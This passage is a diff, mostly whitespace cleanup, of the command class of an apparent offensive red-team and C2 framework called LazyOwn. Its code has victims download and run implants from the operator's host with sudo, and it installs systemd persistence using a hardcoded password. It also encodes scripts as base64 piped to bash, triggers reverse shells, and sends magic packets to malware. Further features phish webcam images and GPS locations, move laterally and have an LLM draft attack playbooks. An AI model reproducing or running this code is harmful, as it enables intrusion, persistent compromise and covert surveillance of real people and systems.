         final_infect = f"{sessions}/{nameinfect}"
         with open(shellcode, 'r') as f:
             content_shellcode = f.read().strip()
-            
+
         with open(shell, 'r') as f:
             content_c = f.read().strip()
- 
+
             content_c = content_c.replace("{shellcode}", content_shellcode)
-     
+
 
         with open(infect_pid, 'r') as f:
             infect = f.read().strip()
@@ -24939,8 +24941,8 @@ class LazyOwnShell(cmd2.Cmd):
 
         copy2clip(command)
         return
-    
-    @cmd2.with_category(post_exploitation_category)    
+
+    @cmd2.with_category(post_exploitation_category)
     def do_ssh_cmd(self, line):
         """
         Perform Remote Execution Command trow ssh using grisun0 user, see help grisun0
@@ -24960,8 +24962,8 @@ class LazyOwnShell(cmd2.Cmd):
         ssh = f"""sshpass -p '{password}' ssh {username}@{rhost} 'echo "{password}" | sudo -S {line}'"""
         self.cmd(ssh)
         return
-    
-    @cmd2.with_category(miscellaneous_category)    
+
+    @cmd2.with_category(miscellaneous_category)
     def do_clone_site(self, line):
         """Clone a website and serve the files in sessions/{url_cloned}.
         Args:
@@ -25005,7 +25007,7 @@ class LazyOwnShell(cmd2.Cmd):
         if os.path.isfile(os.path.join(session_path, "index.html")):
             print_msg("Site cloned successfully.")
 
-    @cmd2.with_category(persistence_category)   
+    @cmd2.with_category(persistence_category)
     def do_knokknok(self, line):
         """Send special string to trigger a reverse shell, with the command 'c2 client_name'
         create a listener shell script to drop the reverse shell in python3
@@ -25014,7 +25016,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
             None
-        """        
+        """
         HOST = self.params["rhost"]
         if line:
             PORT = line.strip()
@@ -25031,8 +25033,8 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception:
             print_error("Listener is not listen.")
         return
-    
-    @cmd2.with_category(persistence_category)   
+
+    @cmd2.with_category(persistence_category)
     def do_listener_go(self, line):
         """
         Configures and starts a listener for a specified victim.
@@ -25083,8 +25085,8 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
             return
-        
-        lhost = self.params["lhost"]  
+
+        lhost = self.params["lhost"]
         implant_go2 = f"l_{line}_l.exe"
         if choice == "2":
             command = f"curl -o /home/grisun0/l_{line} http://{lhost}/l_{line} && sudo -S chmod +x /home/grisun0/l_{line} && sudo -S nohup /home/grisun0/l_{line} & \\n"
@@ -25099,7 +25101,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.onecmd(f'nc {listener}')
         return
 
-    @cmd2.with_category(persistence_category)   
+    @cmd2.with_category(persistence_category)
     def do_listener_py(self, line):
         """
         Configures and starts a listener for a specified victim.
@@ -25150,9 +25152,9 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print_error("3 You need to specify the victim-id, for example: listener victim. (1 win ps1 | 2 linux | 3 win bat) 1337 remote listen 6666 (port listener nc) ")
             return
-        
-        lhost = self.params["lhost"]  
-  
+
+        lhost = self.params["lhost"]
+
         if choice == "2":
             command = f"curl -o /home/.grisun0/l_{line}.sh http://{lhost}/listener_{line}.sh && sudo -S chmod +x /home/.grisun0/l_{line}.sh && sudo -S nohup /bin/bash /home/.grisun0/l_{line}.sh & \\n"
         else:
@@ -25166,7 +25168,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.onecmd(f'nc {listener}')
         return
 
-    @cmd2.with_category(recon_category)   
+    @cmd2.with_category(recon_category)
     def do_ipinfo(self, line):
         """
         Retrieves detailed information about an IP address using the ARIN API.
@@ -25186,7 +25188,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Example:
             >>> ipinfo 1.1.1.1
-        """        
+        """
         ip = line.strip()
         if not ip:
             print_error("Error: Por favor, proporciona una dirección IP.")
@@ -25222,9 +25224,9 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"[!] {ip}")
         print_msg(f" |_ {name}")
         print_msg(f" \_ {range}")
-        return 
+        return
 
-    @cmd2.with_category(post_exploitation_category)   
+    @cmd2.with_category(post_exploitation_category)
     def do_service_ssh(self, line):
         """
         Creates a systemd service file for a specified binary and generates a script to enable and start the service.
@@ -25245,7 +25247,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Example:
             >>> service my_binary_name
-        """    
+        """
         binary_name = line.strip()
         lhost = self.params["lhost"]
         if not binary_name:
@@ -25273,9 +25275,9 @@ class LazyOwnShell(cmd2.Cmd):
         [Install]
         WantedBy=multi-user.target
         EOL
-        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service && 
-        sudo systemctl daemon-reload && 
-        sudo systemctl start {binary_name} && 
+        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service &&
+        sudo systemctl daemon-reload &&
+        sudo systemctl start {binary_name} &&
         sudo systemctl enable {binary_name}
         """.replace('        ','')
 
@@ -25289,12 +25291,12 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Failed to create service file: {e}")
             return
 
-        password = 'grisgrisgris'    
+        password = 'grisgrisgris'
         cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg(f"Run the following command to enable and start the service:")
         self.onecmd(f"ssh_cmd {cmd}")
 
-    @cmd2.with_category(persistence_category)  
+    @cmd2.with_category(persistence_category)
     def do_service(self, line):
         """
         Creates a systemd service file for a specified binary and generates a script to enable and start the service.
@@ -25315,7 +25317,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         Example:
             >>> service my_binary_name
-        """    
+        """
         binary_name = line.strip()
         lhost = self.params["lhost"]
         if not binary_name:
@@ -25343,9 +25345,9 @@ class LazyOwnShell(cmd2.Cmd):
         [Install]
         WantedBy=multi-user.target
         EOL
-        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service && 
-        sudo systemctl daemon-reload && 
-        sudo systemctl start {binary_name} && 
+        sudo cp {binary_name}.service /etc/systemd/system/{binary_name}.service &&
+        sudo systemctl daemon-reload &&
+        sudo systemctl start {binary_name} &&
         sudo systemctl enable {binary_name}
         """.replace('        ','')
 
@@ -25359,11 +25361,11 @@ class LazyOwnShell(cmd2.Cmd):
             print_error(f"Failed to create service file: {e}")
             return
 
-        password = 'grisgrisgris'    
+        password = 'grisgrisgris'
         cmd = f"curl http://{lhost}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg(f"Run the following command to enable and start the service: {cmd}")
-    
-    @cmd2.with_category(persistence_category)  
+
+    @cmd2.with_category(persistence_category)
     def do_toctoc(self, line):
         """
         Sends a magic packet to the Chinese malware.
@@ -25374,7 +25376,7 @@ class LazyOwnShell(cmd2.Cmd):
 
         if not rhost or not rport:
             raise ValueError("rhost and rport must be specified in params")
-        
+
         try:
             rport = int(rport)
         except ValueError:
@@ -25385,8 +25387,8 @@ class LazyOwnShell(cmd2.Cmd):
             sock.sendto(magic_packet, (rhost, rport))
 
         print(f"Magic packet sent to {rhost}:{rport}")
-    
-    @cmd2.with_category(exfiltration_category)  
+
+    @cmd2.with_category(exfiltration_category)
     def do_download_c2(self, line):
         """
         Download a file from the command and control (C2) server.
@@ -25398,14 +25400,14 @@ class LazyOwnShell(cmd2.Cmd):
 
         Returns:
             None
-        """        
+        """
         if not line:
             print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
             return
         self.download_file_from_c2(line)
         return
-    
-    @cmd2.with_category(reporting_category)  
+
+    @cmd2.with_category(reporting_category)
     def do_groq(self, line):
         """
         Execute a command to interact with the GROQ API using the provided API key.
@@ -25427,9 +25429,9 @@ class LazyOwnShell(cmd2.Cmd):
             prompt = line.strip()
         print_msg(f"Executing... python3 {self.path}/modules/lazygptcli2.py --prompt '{prompt}'")
         os.system(f"export GROQ_API_KEY=\"{api_key}\" && python3 {self.path}/modules/lazygptcli2.py --prompt '{prompt}'")
-        return 
-    
-    @cmd2.with_category(reporting_category)  
+        return
+
+    @cmd2.with_category(reporting_category)
     def do_c2asm(self, arg):
         """
         Display C and ASM code side by side in a curses-based interface.
@@ -25447,7 +25449,7 @@ class LazyOwnShell(cmd2.Cmd):
             None
         """
         curses.wrapper(self.view_code)
-        
+
     def view_code(self, stdscr):
         """
         Display C and ASM code side by side in a curses-based interface.
@@ -25519,7 +25521,7 @@ class LazyOwnShell(cmd2.Cmd):
         while True:
             stdscr.clear()
 
-    
+
             for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                 if i < len(c_code):
                     line = c_code[i].rstrip()
@@ -25531,7 +25533,7 @@ class LazyOwnShell(cmd2.Cmd):
                     except curses.error:
                         pass
 
-    
+
             for i in range(top_line, top_line + stdscr.getmaxyx()[0]):
                 if i < len(asm_code):
                     line = asm_code[i].rstrip()
@@ -25545,7 +25547,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             stdscr.refresh()
 
-    
+
             key = stdscr.getch()
             if key == curses.KEY_UP and selected_line > 0:
                 selected_line -= 1
@@ -25557,8 +25559,8 @@ class LazyOwnShell(cmd2.Cmd):
                     top_line += 1
             elif key == 27:
                 break
-    
-    @cmd2.with_category(reporting_category)  
+
+    @cmd2.with_category(reporting_category)
     def do_camphish(self, line):
         """
         Executes the camphish tool for Grab cam shots from target's phone front camera or PC webcam just sending a link.
@@ -25591,7 +25593,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"An error occurred: {e}")
 
-    @cmd2.with_category(scanning_category)  
+    @cmd2.with_category(scanning_category)
     def do_hound(self, line):
         """
         Executes the hound tool for Hound is a simple and light tool for information gathering and capture exact GPS coordinates
@@ -25624,7 +25626,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"An error occurred: {e}")
 
-    @cmd2.with_category(post_exploitation_category)  
+    @cmd2.with_category(post_exploitation_category)
     def do_ofuscatesh(self, line):
         """
         Obfuscates a shell script by encoding it in Base64 and prepares a command to decode and execute it.
@@ -25642,7 +25644,7 @@ class LazyOwnShell(cmd2.Cmd):
         Example:
             >>> ofuscatesh /path/to/script.sh or just ofuscatesh
             # This will read the script, encode it in Base64, and prepare a command to decode and execute it.
-        """        
+        """
         if not line:
             line = get_users_dic('sh')
 
@@ -25654,7 +25656,7 @@ class LazyOwnShell(cmd2.Cmd):
         cmd = f"echo '{base64_encoded}' | base64 -d | bash"
         copy2clip(cmd)
 
-    @cmd2.with_category(miscellaneous_category)  
+    @cmd2.with_category(miscellaneous_category)
     def do_load_session(self, line):
         """
         Load the session from the sessionLazyOwn.json file and display the status of various parameters.
@@ -25686,7 +25688,7 @@ class LazyOwnShell(cmd2.Cmd):
                 formatted_date_time = dt_object.strftime('%Y-%m-%d %H:%M:%S')
             else:
                 formatted_date_time = 'N/A'
-            
+
             print_msg(f"N° Params {params_count} [LOADED][OK]")
             print_msg(f"N° Credentials {credentials_count} [LOADED][OK]")
             print_msg(f"N° Hashes {hashes_count} [LOADED][OK]")
@@ -25705,7 +25707,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"An unexpected error occurred: {e}")
 
-    @cmd2.with_category(lateral_movement_category)  
+    @cmd2.with_category(lateral_movement_category)
     def do_lateral_mov_lin(self, line):
         """
         Perform lateral movement by downloading and installing LazyOwn on a remote Linux machine.
@@ -25720,7 +25722,7 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
             None
         """
-        
+
         print_error("Downloading LazyOwn" + self.url_download)
 
         version = self.version.replace("/","-")
@@ -25731,7 +25733,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(f"mkdir -p {tmp}")
         sessions = f"{self.path}/sessions/"
         self.onecmd("apt_proxy remote")
-        self.onecmd("pip_proxy remote")        
+        self.onecmd("pip_proxy remote")
         if not os.path.exists(f"{sessions}/{name}"):
             command = f"cd {sessions} && wget -O {name} --header='Accept: application/gzip' {self.url_download}"
             self.cmd(command)
@@ -25752,7 +25754,7 @@ class LazyOwnShell(cmd2.Cmd):
         self.cmd(ssh_install)
         return
 
-    @cmd2.with_category(exploitation_category)  
+    @cmd2.with_category(exploitation_category)
     def do_commix(self, line):
         """
         Executes the Commix tool for detecting and exploiting command injection vulnerabilities.
@@ -25795,11 +25797,11 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"Error: {e}")
 
-    @cmd2.with_category(lateral_movement_category)  
+    @cmd2.with_category(lateral_movement_category)
     def do_addcli(self, line):
         """
         Add a client to execute c2 commands
-        
+
         Parameters:
             line (str): The command line input, which is not used in this function.
 
@@ -25810,18 +25812,18 @@ class LazyOwnShell(cmd2.Cmd):
             line = input("    [!] Enter the client_id (default: no_priv): ") or 'no_priv'
         self.c2_clientid = line.strip()
 
-    @cmd2.with_category(post_exploitation_category)  
+    @cmd2.with_category(post_exploitation_category)
     def do_adversary(self, line):
         """
         LazyOwn RedTeam Adversary Emulator, you can configure your own adversaries in adversary.json
 
         Parameters:
-            line (str): The command line input, 
-            first argument optional is the id of Adversary, 
+            line (str): The command line input,
+            first argument optional is the id of Adversary,
             the second optional argument is if the adversary run locally (l), remote (r), or doesn't run (n)
-        
+
         Example: adversary 1 r
-        
+
         Returns:
             None
         """
@@ -25854,7 +25856,7 @@ class LazyOwnShell(cmd2.Cmd):
             elif len(line) == 1:
                 confirm = None
                 id_adversary = line.strip()
-            
+
         adversary = next((adv for adv in adversaries if adv.id == int(id_adversary)), None)
 
         if adversary:
@@ -25876,7 +25878,7 @@ class LazyOwnShell(cmd2.Cmd):
 
             if adversary.target_os == 'linux':
                 user_agent = self.params["user_agent_lin"]
-            elif adversary.target_os == 'windows':    
+            elif adversary.target_os == 'windows':
                 user_agent = self.params["user_agent_win"]
 
 
@@ -25887,7 +25889,7 @@ class LazyOwnShell(cmd2.Cmd):
             copy_command = replace_placeholders(adversary.copy_command, replacements)
             replace_command = replace_placeholders(adversary.replace_command, replacements)
             replace_command = replace_command.replace("[shellcode]","{shellcode}")
-            
+
             if adversary.id == 5:
                 print_warn(f"{path}/{adversary.output_path}/{adversary.name}")
                 with open(f"{path}/{adversary.output_path}/{adversary.name}", 'r') as f:
@@ -25953,12 +25955,12 @@ class LazyOwnShell(cmd2.Cmd):
         else:
             print(f"No adversary found with id {line}")
 
-    @cmd2.with_category(post_exploitation_category) 
+    @cmd2.with_category(post_exploitation_category)
     def do_ofuscate_string(self, line):
         """Ofuscate a string into Go code."""
-        
+
         from rich import print
-        from rich.syntax import Syntax        
+        from rich.syntax import Syntax
 
         parser = argparse.ArgumentParser(description="Ofuscate a string into Go code.")
         parser.add_argument('variable_name', type=str, help='The name of the variable in Go code.')
@@ -26000,32 +26002,32 @@ class LazyOwnShell(cmd2.Cmd):
         """Devuelve una lista de acciones disponibles usando introspección de cmd2."""
         # Usa get_all_commands() para obtener todos los comandos definidos como do_*
         return self.get_all_commands()
-    
-    @cmd2.with_category(reporting_category)  
+
+    @cmd2.with_category(reporting_category)
     def do_get_avaible_actions(self, line):
         """Get list de supported acctions."""
         actions = self.get_available_actions()
         print_msg(actions)
 
-    @cmd2.with_category(post_exploitation_category)  
+    @cmd2.with_category(post_exploitation_category)
     def do_path2hex(self, line: str) -> None:
         """
         Convert a binary path to x64 little-endian hex code for shellcode injection.
-        
-        Generates an 8-byte aligned hex string padded with '/' for direct use in 
+
+        Generates an 8-byte aligned hex string padded with '/' for direct use in
         x64 assembly syscall examples. Output format mimics: 0x68732f2f6e69622f ('/bin/sh').
 
         License: GPL v3 (https://www.gnu.org/licenses/gpl-3.0.html)
 
         Args:
             line: Input path (e.g., '/bin/ls')
-        
+
         Technical Process:
             1. Null-terminate input
             2. Pad with '/' to 8 bytes
             3. Convert to little-endian 64-bit hex
             4. Validate ASCII-only characters
-        
+
         Examples:
             Input:  '/bin/sh'
             Output: 0x68732f2f6e69622f
@@ -26053,12 +26055,12 @@ class LazyOwnShell(cmd2.Cmd):
 
         except UnicodeEncodeError:
             self.poutput("Error: Solo caracteres ASCII permitidos")
-    
-    @cmd2.with_category(post_exploitation_category) 
+
+    @cmd2.with_category(post_exploitation_category)
     def do_hex2shellcode(self, line: str) -> None:
         """
         Convert raw hex payload from msfvenom into NASM-compatible shellcode format.
-        
+
         Transforms a continuous hex string (e.g., msfvenom output) into a properly formatted
         assembly data section with line-wrapped db directives. Handles byte alignment and
         validation.
@@ -26091,27 +26093,27 @@ class LazyOwnShell(cmd2.Cmd):
 
             # Split into byte array
             byte_list = [f"0x{clean_hex[i:i+2]}" for i in range(0, len(clean_hex), 2)]
-            
+
             # NASM formatting
             output = ["section .data"]
             output.append("shellcode:")
-            
+
             # Split into chunks of 16 bytes
             for i in range(0, len(byte_list), 16):
                 chunk = byte_list[i:i+16]
                 output.append(f"    db {','.join(chunk)}")
-            
+
             # Add length calculation
             output.append(f"shellcode_len equ $ - shellcode\n")
-            
+
             self.poutput("\n".join(output))
 
         except ValueError as ve:
             self.poutput(f"Hex conversion error: {str(ve)}")
         except Exception as e:
             self.poutput(f"Critical error: {str(e)}")
-    
-    @cmd2.with_category(post_exploitation_category) 
+
+    @cmd2.with_category(post_exploitation_category)
     def do_ai_playbook(self, line):
         """
         Generates an offensive playbook using:
@@ -26122,10 +26124,10 @@ class LazyOwnShell(cmd2.Cmd):
         Usage: ai_playbook <csv_file> [playbook_name] [model_name]
         Example: ai_playbook nmap_results.csv ScepterAttack llama3
         """
-        
+
         # Parse the command arguments
         args = line.strip().split()
-        
+
         if not args:
             csv_file = f"sessions/vulns_{self.params.get('rhost', 'unknown')}.csv"
             playbook_name = f"AutoGeneratedPlaybook"
@@ -26167,7 +26169,7 @@ class LazyOwnShell(cmd2.Cmd):
             # 3. Generate structured prompt
             print_msg("[*] Creating prompt for LLM...")
             base_prompt = f"Generate attack plan for target: {os.path.basename(csv_file)}"
-            
+
             # Use the strict YAML prompt generator
             complex_prompt = self._create_strict_yaml_prompt(
                 base_prompt=base_prompt,
@@ -26177,38 +26179,38 @@ class LazyOwnShell(cmd2.Cmd):
 
             # 4. Query LLM model
             print_msg(f"[*] Generating playbook with {model_name}...")
-            
+
             # Store the prompt for debugging
             debug_dir = "debug"
             os.makedirs(debug_dir, exist_ok=True)
             with open(f"{debug_dir}/prompt_{playbook_name}.txt", "w") as f:
                 f.write(complex_prompt)
-            
+
             # Make multiple attempts if needed
             max_attempts = 3
             response = None
-            
+
             for attempt in range(1, max_attempts + 1):
                 response = query_ollama(complex_prompt, model=model_name)
-                
+
                 if not response:
                     print_error(f"[!] Attempt {attempt}: Failed to get response from Ollama")
                     continue
-                    
+
                 # Store last response for debugging
                 self._last_llm_response = response
-                
+
                 # Simple validation test
                 if response.strip().startswith("apt_name:") or "apt_name:" in response[:100]:
                     print_msg(f"[+] Attempt {attempt}: Got valid-looking YAML response")
                     break
                 else:
                     print_warn(f"[!] Attempt {attempt}: Response doesn't look like valid YAML, retrying...")
-                    
+
                     # Add forceful instructions to the prompt for next attempt
                     if attempt < max_attempts:
                         complex_prompt += "\n\nIMPORTANT: YOUR RESPONSE MUST BE PURE YAML ONLY! NO EXPLANATION TEXT!"
-            
+
             # Save raw response for reference
             raw_file = f"{debug_dir}/raw_{playbook_name}.txt"
             with open(raw_file, "w") as f:
@@ -26217,19 +26219,19 @@ class LazyOwnShell(cmd2.Cmd):
 
             # 5. Process response - handle multiple formats
             print_msg("[*] Parsing LLM response...")
-            
+
             # Pre-process response before YAML parsing
             processed_response = preprocess_llm_response(response)
-            
+
             # Try to parse YAML
             playbook_data = parse_yaml_response(processed_response)
             if not playbook_data:
                 print_error("[!] Failed to parse YAML response")
                 print_error("[!] Attempting fallback manual YAML extraction...")
-                
+
                 # Fallback to manual YAML extraction
                 playbook_data = manual_yaml_extraction(processed_response)
-                
+
                 if not playbook_data:
                     print_error("[!] All parsing attempts failed")
                     print_msg("[*] You can run 'debug_yaml' to analyze the response")
@@ -26239,7 +26241,7 @@ class LazyOwnShell(cmd2.Cmd):
             print_msg("[*] Saving playbook...")
             playbook_path = save_playbook(playbook_data, playbook_name)
             print_msg(f"[+] Playbook generated: {playbook_path}")
-            
+
             # 7. Show summary
             print_msg("\n[+] Playbook Summary:")
             print_msg(f"  Name: {playbook_data.get('apt_name', 'Unknown')}")
@@ -26327,119 +26329,119 @@ class LazyOwnShell(cmd2.Cmd):
         YOUR COMPLETE RESPONSE MUST BE VALID YAML AND NOTHING ELSE.
         """.strip().replace("        ","")
 
-    @cmd2.with_category(post_exploitation_category) 
+    @cmd2.with_category(post_exploitation_category)
     def do_create_synthetic(self, line):
         """
         Create a basic synthetic playbook from Nmap CSV when LLM fails.
-        
+
         Usage: create_synthetic <csv_file> [playbook_name]
         Example: create_synthetic nmap_results.csv SyntheticPlaybook
         """
         args = line.strip().split()
-        
+
         if not args:
             print_error("[!] Missing CSV file path")
             print_msg("[*] Usage: create_synthetic <csv_file> [playbook_name]")
             return
-            
+
         csv_file = args[0]
         playbook_name = args[1] if len(args) > 1 else "SyntheticPlaybook"
-        
+
         if not os.path.exists(csv_file):
             print_error(f"[!] File not found: {csv_file}")
             return
-            
+
         try:
             print_msg(f"[*] Creating synthetic playbook from {csv_file}...")
-            
+
             # Parse the Nmap CSV
             nmap_services = parse_nmap_csv(csv_file)
             if not nmap_services:
                 print_error("[!] No services found in the CSV")
                 return
-                
+
             print_msg(f"[+] Found {len(nmap_services)} services")
-                
+
             # Create synthetic playbook
             playbook_data = create_synthetic_yaml(nmap_services)
-            
+
             # Save the playbook
             playbook_path = save_playbook(playbook_data, playbook_name)
             print_msg(f"[+] Synthetic playbook saved to: {playbook_path}")
-            
+
             # Show summary
             print_msg("\n[+] Synthetic Playbook Summary:")
             print_msg(f"  Name: {playbook_data.get('apt_name', 'Unknown')}")
             print_msg(f"  Description: {playbook_data.get('description', 'No description')}")
             print_msg(f"  Steps: {len(playbook_data.get('steps', []))}")
-            
+
         except Exception as e:
             import traceback
             print_error(f"[!] Error creating synthetic playbook: {str(e)}")
             print_error(traceback.format_exc())
 
-    @cmd2.with_category(post_exploitation_category) 
+    @cmd2.with_category(post_exploitation_category)
     def do_extract_yaml(self, line):
         """
         Extract YAML from an existing debug file and try to create a playbook.
-        
+
         Usage: extract_yaml <debug_file> [playbook_name]
         Example: extract_yaml debug_AutoGeneratedPlaybook.txt MyPlaybook
         """
         args = line.strip().split()
-        
+
         if not args:
             print_error("[!] Missing debug file path")
             print_msg("[*] Usage: extract_yaml <debug_file> [playbook_name]")
             return
-            
+
         debug_file = args[0]
         playbook_name = args[1] if len(args) > 1 else "ExtractedPlaybook"
-        
+
         if not os.path.exists(debug_file):
             print_error(f"[!] File not found: {debug_file}")
             return
-            
+
         try:
             print_msg(f"[*] Attempting to extract YAML from {debug_file}...")
-            
+
             # Read the debug file
             with open(debug_file, 'r') as f:
                 content = f.read()
-                
+
             # Try to extract useful YAML content
             print_msg("[*] Pre-processing content...")
             processed_content = preprocess_llm_response(content)
-            
+
             # First try normal YAML parsing
             playbook_data = parse_yaml_response(processed_content)
-            
+
             # If that fails, try manual extraction
             if not playbook_data:
                 print_warn("[!] Standard YAML parsing failed, trying manual extraction...")
                 playbook_data = manual_yaml_extraction(processed_content)
-                
+
             if not playbook_data:
                 print_error("[!] All extraction methods failed")
                 return
-                
+
             # Save the extracted playbook
             print_msg("[*] Saving extracted playbook...")
             playbook_path = save_playbook(playbook_data, playbook_name)
             print_msg(f"[+] Playbook saved to: {playbook_path}")
-            
+
             # Show summary
             print_msg("\n[+] Extracted Playbook Summary:")
             print_msg(f"  Name: {playbook_data.get('apt_name', 'Unknown')}")
             print_msg(f"  Description: {playbook_data.get('description', 'No description')[:50]}...")
             print_msg(f"  Steps: {len(playbook_data.get('steps', []))}")
-            
+
         except Exception as e:
             import traceback
             print_error(f"[!] Error during extraction: {str(e)}")
             print_error(traceback.format_exc())
-            
-    @cmd2.with_category(reporting_category) 
+
+    @cmd2.with_category(reporting_category)
     def do_img2vid(self, line):
         """
         Generates an MP4 video from PNG images found in the sessions/captured_images directory.
@@ -26487,7 +26489,7 @@ class LazyOwnShell(cmd2.Cmd):
         except Exception as e:
             print_error(f"An unexpected error occurred: {e}")
 
-    @cmd2.with_category(post_exploitation_category) 
+    @cmd2.with_category(post_exploitation_category)
     def do_convert_remcomsvc_from_file(self, arg):
         """Converts the Python REMCOMSVC byte string from remcomsvc.py to Golang byte slice format, prints a sample, and saves it to sessions/remcomsvc.go. see lazyaddon GoPEInjection
         Usage: convert_remcomsvc_from_file
@@ -26539,11 +26541,11 @@ class LazyOwnShell(cmd2.Cmd):
             "hosts": [],
             "services": [],
             "vulnerabilities": [],
-            
+
         }
         processed_ips = set()
 
-        
+
         scan_files = glob.glob(os.path.join(self.sessions_dir, "scan_*.csv"))
         for scan_file in scan_files:
             match = re.match(r"scan_([^_]+)_(\d+).csv", os.path.basename(scan_file))
@@ -26562,7 +26564,7 @@ class LazyOwnShell(cmd2.Cmd):
                 ip = match.group(1)
                 self.process_scan_csv(scan_file, ip, None, all_data, processed_ips)
 
-        
+
         vuln_files = glob.glob(os.path.join(self.sessions_dir, "vulns_*.csv"))
         for vuln_file in vuln_files:
             match = re.match(r"vulns_([^_]+).csv", os.path.basename(vuln_file))
@@ -26610,7 +26612,7 @@ class LazyOwnShell(cmd2.Cmd):
                     "service": row['SERVICE'],
                     "version": row['VERSION']
                 }
-                
+
                 found_service = next((s for s in all_data['services'] if
                                     s['ip'] == service_entry['ip'] and
                                     s['port'] == service_entry['port'] and
@@ -26627,8 +26629,8 @@ class LazyOwnShell(cmd2.Cmd):
                     "service": row['SERVICE'],
                     "version": row['VERSION']
                 }
-                
-                
+
+
                 found_service_for_vuln = next((s for s in all_data['services'] if
                                                s['ip'] == vulnerability_entry['ip'] and
                                                s['port'] == vulnerability_entry['port'] and
@@ -26638,7 +26640,7 @@ class LazyOwnShell(cmd2.Cmd):
                 if found_service_for_vuln:
                     if "vulnerabilities" not in found_service_for_vuln:
                         found_service_for_vuln["vulnerabilities"] = []
-                    
+
                     vuln_id = f"{ip}:{row['PORT']}:{row['SERVICE']}"
                     if vuln_id not in [v['id'] for v in found_service_for_vuln["vulnerabilities"] if 'id' in v]:
                         found_service_for_vuln["vulnerabilities"].append({"id": vuln_id, "description": "Known vulnerability (inferred from filename)"})
@@ -26839,7 +26841,7 @@ if __name__ == "__main__":
         )
 
     else:
-        p.onecmd("rhost clean")    
+        p.onecmd("rhost clean")
     p.onecmd('p')
     p.onecmd('ipp')
     p.onecmd("createcredentials")
